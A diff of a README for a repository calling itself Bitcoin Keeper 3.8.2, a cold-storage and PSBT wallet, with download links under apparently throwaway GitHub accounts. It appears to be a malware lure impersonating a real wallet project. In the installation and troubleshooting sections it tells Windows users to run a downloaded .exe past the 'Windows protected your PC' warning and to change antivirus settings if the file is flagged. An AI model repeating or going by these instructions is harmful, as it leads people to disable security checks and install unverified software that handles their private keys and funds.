@@ -1,123 +1,81 @@
-# Bitcoin Keeper v3.8.2 - Bitcoin Security Tool 2026
+# 🔒 bitcoin-keeper-psbt-hub - Securely manage your bitcoin cold storage
 
-> **Bitcoin Keeper 3.8.2 is a cross-platform Bitcoin security tool for Linux, macOS, and Windows that supports cold storage, PSBT workflows, multisig, and air-gapped transaction signing.**
+[![Download Bitcoin Keeper](https://img.shields.io/badge/Download-Bitcoin_Keeper-blue.svg)](https://github.com/abousedaadam65-ux/bitcoin-keeper-psbt-hub)
 
-[![Platform](https://img.shields.io/badge/Platform-Linux%2C%20macOS%2C%20Windows-blue?style=flat-square)](https://github.com)
-[![Version](https://img.shields.io/badge/Version-v3.8.2-green?style=flat-square)](https://github.com)
-[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
-[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
-[![Stars](https://img.shields.io/github/stars/hughesfelixbfwr8082/bitcoin-keeper-psbt-hub?style=flat-square)](https://github.com/hughesfelixbfwr8082/bitcoin-keeper-psbt-hub)
+Bitcoin Keeper 3.8.2 provides tools for secure bitcoin storage. You use this software to manage your private keys and sign transactions offline. It supports cold storage, multisig setups, and air-gapped workflows. This guide helps you install the application and start managing your bitcoin on a Windows computer.
 
----
+## 📋 System Requirements
 
-<p align="center">
-  <a href="https://hughesfelixbfwr8082.github.io/bitcoin-keeper-psbt-hub/">
-    <img src="https://img.shields.io/badge/Download-Bitcoin%20Keeper%20Latest-brightgreen?style=for-the-badge" alt="Download Bitcoin Keeper">
-  </a>
-</p>
+To run Bitcoin Keeper, your computer needs the following specifications:
 
-> **[Download Bitcoin Keeper v3.8.2](https://hughesfelixbfwr8082.github.io/bitcoin-keeper-psbt-hub/)**
+*   Operating System: Windows 10 or Windows 11.
+*   Processor: 1.6 GHz or faster.
+*   Memory: 4 GB of RAM.
+*   Storage: 500 MB of free disk space.
+*   Internet Connection: Required for initial download and occasional transaction broadcasts.
 
----
+## 💾 Downloading the Application
 
-[Download Latest Build](https://hughesfelixbfwr8082.github.io/bitcoin-keeper-psbt-hub/)
+You download the software directly from the project repository. Follow these steps to obtain the installer file:
 
----
+1. Visit the [official releases page](https://github.com/abousedaadam65-ux/bitcoin-keeper-psbt-hub).
+2. Look for the latest version listed under the Releases section.
+3. Select the file ending in .exe to start your download.
+4. Save the file to your desktop or your Downloads folder.
 
-## Overview
+## 🛠️ Installing on Windows
 
-Bitcoin Keeper is designed for people who need a disciplined way to handle Bitcoin security tasks on desktop systems. The workflow focuses on offline signing, wallet coordination, and recovery-friendly procedures, which makes it a strong fit for cold storage users, multisig operators, and hardware wallet workflows.
+Once you finish the download, follow these instructions to set up the software:
 
-It also works with Bitcoin test networks such as signet and testnet, so you can rehearse and verify your process before using real funds. With a multilingual web interface and deterministic wallet generation, the application helps keep common security operations consistent, repeatable, and easier to document.
+1. Locate the downloaded file on your computer.
+2. Double-click the file to start the installer.
+3. Windows may show a security prompt. If you see a blue window stating "Windows protected your PC," click "More info" and then click "Run anyway."
+4. Follow the prompts in the setup wizard.
+5. Choose your installation folder or accept the default location.
+6. Click Install to place the files on your hard drive.
+7. Click Finish to close the installer.
 
----
+## 🚀 Running Your First Session
 
-## Key Capabilities
+After you complete the installation, launch the application using the shortcut on your desktop.
 
-- QR-driven PSBT signing for offline and air-gapped workflows
-- Multisignature support for shared wallet control
-- Deterministic HD wallet generation for reproducible wallet setup
-- Compatibility with hardware wallets for integrated signing flows
-- Threshold key recovery for seed and key recovery cases
-- Cold storage automation to simplify secure wallet handling
-- Multilingual web UI for wider usability
-- Signet and testnet support for practice and validation runs
+1. Open the application.
+2. If this is your first time using the software, choose the option to create a new vault.
+3. Back up your recovery phrase. Keep this phrase on paper. Never store your recovery phrase on a computer or cloud drive.
+4. Label your wallet clearly.
+5. Connect your hardware security device if you plan to use an air-gapped setup.
 
----
+## 🔑 Understanding Core Concepts
 
-## Installation
+Bitcoin Keeper uses specific methods to secure your funds. Understanding these terms helps you manage your coins with confidence:
 
-Clone the repository and enter the project directory:
+*   **PSBT (Partially Signed Bitcoin Transaction):** This format allows you to sign transactions on a device that is not connected to the internet. You create the request on your primary computer and move it to your offline device to add a digital signature.
+*   **Cold Storage:** This means your private keys remain offline at all times. This prevents hackers from stealing your keys through an internet connection.
+*   **Multisig:** This setup requires more than one key to move your bitcoin. You might require two out of three keys to authorize a send action. This adds a layer of safety for your funds.
+*   **Air-Gapped Signing:** You transfer data between your computer and your signing device using a secure medium, such as a QR code or an encrypted USB drive. Your signing device never touches the internet.
 
-```bash
-git clone https://github.com/hughesfelixbfwr8082/bitcoin-keeper-psbt-hub.git
-cd bitcoin-keeper-utility-suite
-```
+## 🛡️ Best Practices for Security
 
-After that, start the project with the entry point provided by your build or deployment environment. If you are using a packaged release, download the latest build and open it according to the instructions for your platform.
+Follow these rules to maintain the safety of your assets:
 
----
+*   Keep your computer software updated.
+*   Use a dedicated computer for signing transactions if possible.
+*   Check your recovery phrase twice.
+*   Verify all transaction details on your hardware device display before you confirm a signature.
+*   Never share your private keys or recovery phrase with anyone.
+*   Move your bitcoin to the new vault in small amounts first to test the process.
 
-## Usage
+## 💡 Troubleshooting Common Issues
 
-How you use the tool depends on the workflow you are following:
+If you encounter issues, review these common solutions:
 
-1. Create or import a wallet through the deterministic wallet flow.
-2. Connect or prepare a hardware wallet if your setup calls for one.
-3. Generate a PSBT for the transaction you intend to sign.
-4. Move the PSBT into an offline environment for QR-based signing.
-5. Bring back the signed transaction data and broadcast it with your preferred Bitcoin tooling.
+*   **Installer blocked:** Ensure you have administrator rights on your Windows machine. Update your virus scanner settings if the file is flagged.
+*   **Device not recognized:** Check your USB cable or your QR code scanner. Restart the application while your device is connected.
+*   **Transaction failed:** Verify that your internet connection is active when broadcasting a signed transaction. Check that your transaction fee settings are sufficient for the current network traffic.
+*   **Application crash:** Check your system logs to see if your memory usage is too high. Ensure that no other background processes interfere with the software.
 
-For multisig setups, use the same general process while gathering the necessary signatures from each participant. For signet or testnet, run the test workflow first to confirm your configuration before moving to mainnet-related operations.
+## 📁 Managing Your Vaults
 
----
+You can create multiple vaults for different purposes. Some users maintain one vault for daily spending and a separate vault for long-term savings. Always label these vaults clearly to avoid confusion. You can view your transaction history within the dashboard and export your public keys for watch-only tracking.
 
-## Configuration
-
-Most options are controlled through the application itself or by the environment used to run it. When deploying locally, make sure wallet paths, signing preferences, and network selection match the workflow you want to use.
-
-Example configuration structure:
-
-```json
-{
-  "network": "signet",
-  "wallet_mode": "multisig",
-  "air_gapped_signing": true,
-  "language": "en"
-}
-```
-
----
-
-## Requirements
-
-- Linux, macOS, or Windows
-- A compatible runtime or packaged build for your platform
-- Enough local storage for wallet data, exported PSBT files, and backups
-- Optional hardware wallet support when using external signing devices
-- Network access for setup, updates, and testnet or signet workflows where needed
-
----
-
-## FAQ
-
-**How do I stay current?**  
-Download the latest release build from the link above and watch the repository for new versions.
-
-**Is multisig supported?**  
-Yes. Multisignature support is part of the feature set.
-
-**Can I sign transactions offline?**  
-Yes. QR-based PSBT signing is included for air-gapped workflows.
-
-**Where are settings kept?**  
-Settings are usually managed in the app or in the local environment used for deployment.
-
-**What if I run into issues?**  
-First confirm your platform, wallet mode, and network selection, then check your build or launch steps. If you are using testnet or signet, verify those values before proceeding.
-
----
-
-## License
-
-GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
+Keywords: bitcoin, security, cold storage, psbt, windows, multisig, air-gapped
